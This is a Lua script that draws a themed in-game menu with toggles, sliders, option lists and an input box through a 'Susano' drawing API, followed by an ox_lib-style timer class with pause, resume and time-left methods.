THEME["backgroundTransparent"]     = hexToColorTable(0x1a1a1aB0)

THEME["SubMenuBackground"]         = hexToColorTable(0xff7afd9c)
THEME["SubMenuBackgroundSelected"] = hexToColorTable(0xfc30f96A)

THEME["MenuTextSize"]              = ScreenScale(26)
THEME["MenuEntryTextSize"]         = ScreenScale(18)

THEME["TextColor"]                 = { 255, 255, 255, 255 }

THEME["Fonts"]                     = {
    ["MenuText"] = { "Roboto", "regular" },
}

THEME["Banners"]                   = {
    [1] = Susano.LoadTextureFromBuffer(HTTPGET("https://i.imgur.com/TI8okTO.png"))
}

_G.SELECTEDBANNER                  = 1




function ToColor(tbl) -- TODO: Instead of / 255 every time, do it once over the entire THEME table
    local clone = {}
    for key, value in pairs(tbl or {}) do
        clone[key] = value
    end
    local result = clone
    for i, v in ipairs(result) do
        result[i] = v / 255
    end
    return table.unpack(result)
end

local MENU_SIZE         = { ScreenScale(350), ScreenScale(400) }
local MENU_POSITION     = { ScreenScale(100), ScreenScale(300) }
local INPUT_SIZE        = ScreenScale(40)
local SUBMENU_SIZE_Y    = ScreenScale(40)
_G.ROUNDING             = ScreenScale(10)
local TOP_LINE_SIZE     = ScreenScale(6)

local RENDERTYPE        = {}
RENDERTYPE["button"]    = function(entry, x, y, width, height, is_selected)
    local MenuFont = THEME["Fonts"]["MenuText"]

    local name = entry.name
    local label = tostring(name)
    local textH = THEME["MenuEntryTextSize"]
    local textW = Susano.GetTextWidth(label, textH)
    local textr, textg, textb = ToColor(THEME["TextColor"])

    local rectYMid = y + (height / 2) - (textH / 2)
    Susano.DrawTextWithFont(x + ScreenScale(15), rectYMid, name, MenuFont[1], MenuFont[2], textH, textr, textg, textb, 1)
end

RENDERTYPE["toggle"]    = function(entry, x, y, width, height, is_selected)
    local MenuFont = THEME["Fonts"]["MenuText"]

    local name = entry.name
    local label = tostring(name)
    local textH = THEME["MenuEntryTextSize"]
    local textW = Susano.GetTextWidth(label, textH)

    local rectYMid = y + (height / 2) - (textH / 2)
    local textr, textg, textb = ToColor(THEME["TextColor"])
    Susano.DrawTextWithFont(x + ScreenScale(15), rectYMid, name, MenuFont[1], MenuFont[2], textH, textr, textg, textb, 1)

    local toggleWidth = ScreenScale(50)
    local toggleHeight = ScreenScale(26)
    local toggleX = x + width - toggleWidth - ScreenScale(12)
    local toggleY = y + (height / 2) - (toggleHeight / 2)
    local toggleRounding = toggleHeight / 2

    local sr, sg, sb, sa = ToColor(THEME["SelectedColor"])
    local inactiveBg = { 0.25, 0.25, 0.25, 1 }
    local activeBg = { sr * 0.6, sg * 0.6, sb * 0.6, 1 }

    if entry.value then
        Susano.DrawRoundedFilledRect(toggleRounding, toggleX, toggleY, toggleWidth, toggleHeight,
            activeBg[1], activeBg[2], activeBg[3], activeBg[4], true, true, true, true)
    else
        Susano.DrawRoundedFilledRect(toggleRounding, toggleX, toggleY, toggleWidth, toggleHeight,
            inactiveBg[1], inactiveBg[2], inactiveBg[3], inactiveBg[4], true, true, true, true)
    end

    local dotSize = ScreenScale(20)
    local dotPadding = ScreenScale(3)
    local dotY = toggleY + (toggleHeight / 2) - (dotSize / 2)
    local dotX
    if entry.value then
        dotX = toggleX + toggleWidth - dotSize - dotPadding
    else
        dotX = toggleX + dotPadding
    end

    local dotColor = { 1.0, 1.0, 1.0, 1.0 }
    Susano.DrawRoundedFilledRect(dotSize / 2, dotX, dotY, dotSize, dotSize,
        dotColor[1], dotColor[2], dotColor[3], dotColor[4], true, true, true, true)
end

RENDERTYPE["slider"]    = function(entry, x, y, width, height, is_selected)
    local MenuFont = THEME["Fonts"]["MenuText"]

    local name = entry.name
    local textH = THEME["MenuEntryTextSize"]
    local textr, textg, textb = ToColor(THEME["TextColor"])

    local rectYMid = y + (height / 2) - (textH / 2)
    Susano.DrawTextWithFont(x + ScreenScale(15), rectYMid, name, MenuFont[1], MenuFont[2], textH, textr, textg, textb, 1)

    local padding_left = ScreenScale(15)
    local padding_right = ScreenScale(12)
    local label_space = ScreenScale(220)
    local trackTotalW = width - label_space - padding_left - padding_right
    if trackTotalW < ScreenScale(30) then trackTotalW = ScreenScale(30) end
    local trackH = math.max(ScreenScale(8), height - ScreenScale(24))
    local trackX = x + width - trackTotalW - padding_right
    local trackY = y + (height / 2) - (trackH / 2)
    local trackRounding = trackH / 2

    local minv = entry.settings.min or 0
    local maxv = entry.settings.max or 100
    local val = entry.value or minv
    if maxv == minv then maxv = minv + 1 end
    local pct = math.max(0, math.min(1, (val - minv) / (maxv - minv)))
    local filledW = math.max(ScreenScale(6), trackTotalW * pct)

    local sr, sg, sb, sa = ToColor(THEME["SelectedColor"])
    local inactive = { 0.35, 0.35, 0.35, 1 }
    local shadow = { 0, 0, 0, 0.6 }

    Susano.DrawGradient(trackX, trackY, trackTotalW, trackH, inactive, inactive, inactive, inactive, trackRounding)

    if val ~= minv then
        Susano.DrawGradient(trackX, trackY, filledW, trackH, { sr, sg, sb, sa }, { sr * 0.8, sg * 0.8, sb * 0.8, sa },
            { sr * 0.8, sg * 0.8, sb * 0.8, sa }, { sr, sg, sb, sa }, trackRounding)
    end

    local valLabel = tostring(val)
    local valTextH = textH
    local valTextW = Susano.GetTextWidth(valLabel, valTextH)
    Susano.DrawTextWithFont(trackX - valTextW - ScreenScale(12), rectYMid, valLabel, MenuFont[1], MenuFont[2], valTextH,
        textr, textg, textb, 1)
end

RENDERTYPE["multimenu"] = function(entry, x, y, width, height, is_selected)
    local MenuFont = THEME["Fonts"]["MenuText"]
    local name = entry.name
    local textH = THEME["MenuEntryTextSize"]
    local textr, textg, textb = ToColor(THEME["TextColor"])

    local rectYMid = y + (height / 2) - (textH / 2)
    Susano.DrawTextWithFont(x + ScreenScale(15), rectYMid, name, MenuFont[1], MenuFont[2], textH, textr, textg, textb, 1)

    local arrow = ">"
    local arrowW = Susano.GetTextWidthWithFont(arrow, MenuFont[1], MenuFont[2], textH)
    Susano.DrawTextWithFont(x + width - ScreenScale(15) - arrowW, rectYMid, arrow, MenuFont[1], MenuFont[2], textH, textr,
        textg, textb, 1)
end

RENDERTYPE["menu"]      = function(entry, x, y, width, height, is_selected)
    local MenuFont = THEME["Fonts"]["MenuText"]

    local name = entry.name
    local label = tostring(name)
    local textH = THEME["MenuEntryTextSize"]
    local textW = Susano.GetTextWidth(label, textH)
    local textr, textg, textb = ToColor(THEME["TextColor"])

    local rectYMid = y + (height / 2) - (textH / 2)
    Susano.DrawTextWithFont(x + ScreenScale(15), rectYMid, name, MenuFont[1], MenuFont[2], textH, textr, textg, textb, 1)

    local arrow = ">"
    local arrowW = Susano.GetTextWidthWithFont(arrow, MenuFont[1], MenuFont[2], textH)
    Susano.DrawTextWithFont(x + width - ScreenScale(15) - arrowW, rectYMid, arrow, MenuFont[1], MenuFont[2], textH, textr,
        textg, textb, 1)
end

RENDERTYPE["divider"]   = function(entry, x, y, width, height, is_selected)
    local MenuFont = THEME["Fonts"]["MenuText"]
    local name = entry.name or ""
    local textH = THEME["MenuEntryTextSize"] * 0.85
    local textr, textg, textb = ToColor(THEME["TextColor"])
    textr, textg, textb = textr * 0.7, textg * 0.7, textb * 0.7  -- Dimmer for divider
    
    local rectYMid = y + (height / 2) - (textH / 2)
    
    -- Draw divider line
    local lineY = y + (height / 2)
    local linePadding = ScreenScale(15)
    local lineX1 = x + linePadding
    local lineX2 = x + width - linePadding
    local lineThickness = ScreenScale(1)
    
    local lineColor = { textr * 0.5, textg * 0.5, textb * 0.5, 0.5 }
    Susano.DrawRoundedFilledRect(0, lineX1, lineY - (lineThickness / 2), lineX2 - lineX1, lineThickness,
        lineColor[1], lineColor[2], lineColor[3], lineColor[4], false, false, false, false)
    
    -- Draw text if name is provided
    if name and name ~= "" then
        local textW = Susano.GetTextWidthWithFont(name, MenuFont[1], MenuFont[2], textH)
        local textX = x + (width / 2) - (textW / 2)
        Susano.DrawTextWithFont(textX, rectYMid, name, MenuFont[1], MenuFont[2], textH, textr, textg, textb, 0.8)
    end
end

RENDERTYPE["options"]   = function(entry, x, y, width, height, is_selected)
    local MenuFont = THEME["Fonts"]["MenuText"]
    local textH = THEME["MenuEntryTextSize"]
    local textr, textg, textb = ToColor(THEME["TextColor"])

    local rectYMid = y + (height / 2) - (textH / 2)
    Susano.DrawTextWithFont(x + ScreenScale(15), rectYMid, entry.name, MenuFont[1], MenuFont[2], textH, textr, textg,
        textb, 1)

    local opt = ""
    if type(entry.options) == "table" and #entry.options > 0 then
        local idx = entry.index or 1
        if idx < 1 then idx = 1 end
        if idx > #entry.options then idx = #entry.options end
        opt = tostring(entry.options[idx] or "")
    else
        opt = tostring(entry.value or "")
    end

    local optionLabel = string.format("< %s >", opt)
    local optW = Susano.GetTextWidthWithFont(optionLabel, MenuFont[1], MenuFont[2], textH)
    Susano.DrawTextWithFont(x + width - ScreenScale(15) - optW, rectYMid, optionLabel, MenuFont[1], MenuFont[2], textH,
        textr, textg, textb, 1)
end

RENDERTYPE["INPUTBOX"]  = function(inputbox)
    if not inputbox or not inputbox.enabled then return end

    local MenuFont = THEME["Fonts"]["MenuText"]
    local titleH = THEME["MenuTextSize"]
    local textH = THEME["MenuEntryTextSize"]

    local boxW = MENU_SIZE[1] * 1.2
    local boxH = ScreenScale(140)
    local boxX = (ScreenWidth / 2) - (boxW / 2)
    local boxY = (ScreenHeight / 2) - (boxH / 2)

    -- Header section with top corners only
    local headerH = ScreenScale(50)
    local sr, sg, sb, sa = ToColor(THEME["SelectedColor"])
    Susano.DrawRoundedFilledRect(ROUNDING, boxX, boxY, boxW, headerH, sr * 0.8, sg * 0.8, sb * 0.8, 0.9,
        true, true, false, false)

    -- Title text in header
    local title = tostring(inputbox.title or "Input")
    local titleW = Susano.GetTextWidthWithFont(title, MenuFont[1], MenuFont[2], titleH)
    Susano.DrawTextWithFont(boxX + (boxW / 2) - (titleW / 2), boxY + (headerH / 2) - (titleH / 2), title,
        MenuFont[1], MenuFont[2], titleH, ToColor(THEME["TextColor"]))

    -- Middle input section (no rounding)
    local middleY = boxY + headerH
    local middleH = ScreenScale(60)
    local br, bg, bb, ba = ToColor(THEME["background"])
    Susano.DrawRectFilled(boxX, middleY, boxW, middleH, br, bg, bb, ba * 0.95)

    -- Subtle inner shadow at top of middle section
    Susano.DrawGradient(boxX, middleY, boxW, ScreenScale(4),
        { 0, 0, 0, 0.3 }, { 0, 0, 0, 0 }, { 0, 0, 0, 0 }, { 0, 0, 0, 0.3 }, 0)

    -- Input field
    local inputFieldW = boxW - ScreenScale(40)
    local inputFieldH = ScreenScale(40)
    local inputFieldX = boxX + ScreenScale(20)
    local inputFieldY = middleY + ScreenScale(10)

    -- Input field with accent border
    Susano.DrawRoundedFilledRect(ROUNDING - ScreenScale(4), inputFieldX - ScreenScale(1), inputFieldY - ScreenScale(1),
        inputFieldW + ScreenScale(2), inputFieldH + ScreenScale(2), sr, sg, sb, 0.5, true, true, true, true)

    Susano.DrawRoundedFilledRect(ROUNDING - ScreenScale(5), inputFieldX, inputFieldY, inputFieldW, inputFieldH,
        0.15, 0.15, 0.15, 1, true, true, true, true)

    -- Input text with cursor
    local txt = tostring(inputbox.text or "")
    local display = txt

    local textX = inputFieldX + ScreenScale(12)
    local textY = inputFieldY + (inputFieldH / 2) - (textH / 2)

    Susano.DrawTextWithFont(textX, textY, display, MenuFont[1], MenuFont[2], textH, ToColor(THEME["TextColor"]))

    -- Footer section with bottom corners only
    local footerY = boxY + headerH + middleH
    local footerH = boxH - headerH - middleH
    Susano.DrawRoundedFilledRect(ROUNDING, boxX, footerY, boxW, footerH, br * 0.8, bg * 0.8, bb * 0.8, ba * 0.9,
        false, false, true, true)

    -- Subtle inner shadow at top of footer
    Susano.DrawGradient(boxX, footerY, boxW, ScreenScale(3),
        { 0, 0, 0, 0.25 }, { 0, 0, 0, 0 }, { 0, 0, 0, 0 }, { 0, 0, 0, 0.25 }, 0)

    -- Bottom hint
    local hint = inputbox.hint or "Enter to confirm | ESC to cancel"
    local hintTextSize = textH * 0.75
    local hintW = Susano.GetTextWidthWithFont(hint, MenuFont[1], MenuFont[2], hintTextSize)
    Susano.DrawTextWithFont(boxX + (boxW / 2) - (hintW / 2), footerY + (footerH / 2) - (hintTextSize / 2), hint,
        MenuFont[1], MenuFont[2], hintTextSize, sr * 0.9, sg * 0.9, sb * 0.9, 0.9)
end

_G.__susano_menu_submenu_font_cache = _G.__susano_menu_submenu_font_cache or {}
_G.already_working = {}
MENU:addRenderer(function(self, menu, idx, inputbox)
    Susano.BeginFrame()
    local success, error_msg = pcall(function()
        if _G.SHOW_BANNER and THEME["Banners"] and THEME["Banners"][1] then
            Susano.DrawImage(THEME["Banners"][1], MENU_POSITION[1] - ScreenScale(2), MENU_POSITION[2] - ScreenScale(152),
                MENU_SIZE[1] + ScreenScale(4), ScreenScale(150), 1, 1, 1, 1, ROUNDING)
        end

        local textr, textg, textb = ToColor(THEME["TextColor"])

        local MENU_NAMES = menu and menu.multiMenuInfo and menu.multiMenuInfo.subNames or { menu.name or "" }
        local MENU_INDEX = menu and menu.multiMenuInfo and menu.multiMenuInfo.currentSubIndex or 1
        local SUBMENU_SIZE = MENU_SIZE[1] / #MENU_NAMES
        local VISIBLE_COUNT = 10

        local MENU_ENTRIES_REAL = #menu.entries > VISIBLE_COUNT and VISIBLE_COUNT or #menu.entries
        local lr, lg, lb, la = ToColor(THEME["backgroundTransparent"])
        Susano.DrawRoundedFilledRect(ROUNDING, MENU_POSITION[1] - ScreenScale(2), MENU_POSITION[2] - ScreenScale(2),
            MENU_SIZE[1] + ScreenScale(4), SUBMENU_SIZE_Y + (MENU_ENTRIES_REAL * INPUT_SIZE) + ScreenScale(5), lr, lg, lb,
            la,
            true, true, true,
            true, true)

        local FONT_SIZE_TO_USE = THEME["MenuTextSize"]

        FONT_SIZE_TO_USE = ScreenScale(14)

        for i, menu_text in ipairs(MENU_NAMES) do
            local top_left_rounded = (#MENU_NAMES == 1) or (#MENU_NAMES > 1 and i == 1)
            local top_right_rounded = i == #MENU_NAMES

            local colorTable = (i == MENU_INDEX) and THEME["SubMenuBackgroundSelected"] or THEME["SubMenuBackground"]
            local r, g, b, a = ToColor(colorTable)

            local rectX = (MENU_POSITION[1] + SUBMENU_SIZE * (i - 1))
            local rectY = MENU_POSITION[2]
            local rectW = SUBMENU_SIZE
            local rectH = SUBMENU_SIZE_Y

            Susano.DrawRoundedFilledRect(ROUNDING - ScreenScale(2), rectX, rectY, rectW, rectH, r, g, b, a,
                top_left_rounded,
                top_right_rounded,
                false, false)

            local MenuFont = THEME["Fonts"]["MenuText"]
            local label = tostring(menu_text):upper()
            local textH = FONT_SIZE_TO_USE
            local textW = Susano.GetTextWidthWithFont(label, MenuFont[1], MenuFont[2], textH)

            local rectXMid = rectX + (rectW / 2) - (textW / 2)
            local rectYMid = rectY + (rectH / 2) - (textH / 2)

            Susano.DrawTextWithFont(rectXMid, rectYMid, label, MenuFont[1], MenuFont[2], textH, textr, textg, textb, 1)
        end

        local totalEntries = #menu.entries
        local start = 1

        if totalEntries <= VISIBLE_COUNT then
            start = 1
        else
            if idx > VISIBLE_COUNT then
                start = idx - VISIBLE_COUNT + 1
            else
                start = 1
            end

            local maxStart = totalEntries - VISIBLE_COUNT + 1
            if start > maxStart then start = maxStart end
            if start < 1 then start = 1 end
        end

        local stop = math.min(totalEntries, start + VISIBLE_COUNT - 1)
        for i = start, stop do
            local entry = menu.entries[i]
            local is_selected = idx == i
            local fixed_i = i - start + 1
            local rectX = MENU_POSITION[1]
            local rectY = (MENU_POSITION[2] + INPUT_SIZE) + (fixed_i - 1) * INPUT_SIZE

            local outerColor = THEME["backgroundTransparent"]
            local orr, org, orb, ora = ToColor(outerColor)

            local innerColor = THEME["SelectedColor"]
            local irr, irg, irb, ira = ToColor(innerColor)
            if is_selected then
                Susano.DrawRoundedFilledRect(ROUNDING - ScreenScale(2), rectX, rectY, MENU_SIZE[1], INPUT_SIZE, irr, irg,
                    irb,
                    ira,
                    false, false, i == stop, i == stop) -- TODO: Refactor
            end

            if RENDERTYPE[entry.type] then
                RENDERTYPE[entry.type](entry, rectX, rectY, MENU_SIZE[1], INPUT_SIZE, is_selected)
            end
        end

        local rectX = MENU_POSITION[1] - ScreenScale(20)
        local rectY = (MENU_POSITION[2] + INPUT_SIZE)
        local rectW = ScreenScale(6)
        local rectH = (MENU_ENTRIES_REAL * INPUT_SIZE)

        local r, g, b, a = ToColor(THEME["SelectedColor"])
        Susano.DrawRoundedFilledRect(22, rectX, rectY, rectW, rectH, lr, lg, lb, la, true, true, true, true)

        local pct = math.max(0, math.min(1, (idx / #menu.entries)))
        local filledH = math.max(ScreenScale(6), rectH * pct)

        Susano.DrawRoundedFilledRect(22, rectX, rectY, rectW, filledH, r, g, b, a, true, true, true, true)


        if inputbox.enabled then
            RENDERTYPE["INPUTBOX"](inputbox)
        end
    end)
    

    Susano.SubmitFrame()
end)

---@class TimerPrivateProps
---@field initialTime number the initial duration of the timer.
---@field async? boolean wether the timer should run asynchronously or not
---@field startTime number the gametimer stamp of when the timer starts. changes when paused and played
---@field triggerOnEnd boolean set in the forceEnd method using the optional param. wether or not the onEnd function is triggered when force ending the timer early
---@field currentTimeLeft number current timer length
---@field paused boolean the pause state of the timer

---@class OxTimer : OxClass
---@field private private TimerPrivateProps
---@field start fun(self: self, async?: boolean) starts the timer
---@field onEnd? fun() cb function triggered when the timer finishes
---@field forceEnd fun(self: self, triggerOnEnd: boolean) end timer early and optionally trigger the onEnd function still
---@field isPaused fun(self: self): boolean returns wether the timer is paused or not
---@field pause fun(self: self) pauses the timer until play method is called
---@field play fun(self: self) resumes the timer if paused
---@field getTimeLeft fun(self: self, format?: 'ms' | 's' | 'm' | 'h'): number | table returns the time left on the timer with the specified format rounded to 2 decimal places (miliseconds, seconds, minutes, hours). returns a table of all if not specified.
local timer = lib.class('OxTimer')

---@private
---@param time number
---@param onEnd fun(self: OxTimer)
---@param async? boolean
function timer:constructor(time, onEnd, async)
    assert(type(time) == "number" and time > 0, "Time must be a positive number")
    assert(onEnd == nil or type(onEnd) == "function", "onEnd must be a function or nil")
    assert(type(async) == "boolean" or async == nil, "async must be a boolean or nil")

    self.onEnd = onEnd
    self.private.initialTime = time
    self.private.currentTimeLeft = time
    self.private.startTime = 0
    self.private.paused = false
    self.private.triggerOnEnd = true

    self:start(async)
end

---@protected
function timer:run()
    while self:isPaused() or self:getTimeLeft('ms') > 0 do
        Wait(0)
    end

    if self.private.triggerOnEnd then
        self:onEnd()
    end

    self.private.triggerOnEnd = true
end

function timer:start(async)
    if self.private.startTime > 0 then error('Cannot start a timer that is already running') end

    self.private.startTime = GetGameTimer()

    if not async then return self:run() end

    Citizen.CreateThreadNow(function()
        self:run()
    end)
end

function timer:forceEnd(triggerOnEnd)
    if self:getTimeLeft('ms') <= 0 then return end

    self.private.paused = false
    self.private.currentTimeLeft = 0
    self.private.triggerOnEnd = triggerOnEnd

    Wait(0)
end

function timer:pause()
    if self.private.paused then return end

    self.private.currentTimeLeft = self:getTimeLeft('ms') --[[@as number]]
    self.private.paused = true
end

function timer:play()
    if not self.private.paused then return end
    self.private.startTime = GetGameTimer()
    self.private.paused = false
end

function timer:isPaused()
    return self.private.paused
end

function timer:restart(async)
    self:forceEnd(false)
    Wait(0)
    self.private.currentTimeLeft = self.private.initialTime
    self.private.startTime = 0
    self:start(async)
end

function timer:getTimeLeft(format)
    local ms = self.private.currentTimeLeft - (GetGameTimer() - self.private.startTime)

    local roundedfloat = function(value)
        return tonumber(string.format('%.2f', value))
    end

    if format == 'ms' then
        return roundedfloat(ms)
    end

    local s = ms / 1000

    if format == 's' then
        return roundedfloat(s)
    end

    local m = s / 60

    if format == 'm' then
        return roundedfloat(m)
    end

    local h = m / 60

    if format == 'h' then
        return roundedfloat(h)
    end

    return {
        ms = roundedfloat(ms),
        s = roundedfloat(s),
        m = roundedfloat(m),
        h = roundedfloat(h)
    }
end

---@param time number
---@param onEnd fun(self: OxTimer)
---@param async? boolean
function lib.timer(time, onEnd, async)
    return timer:new(time, onEnd, async)
end

return lib.timer
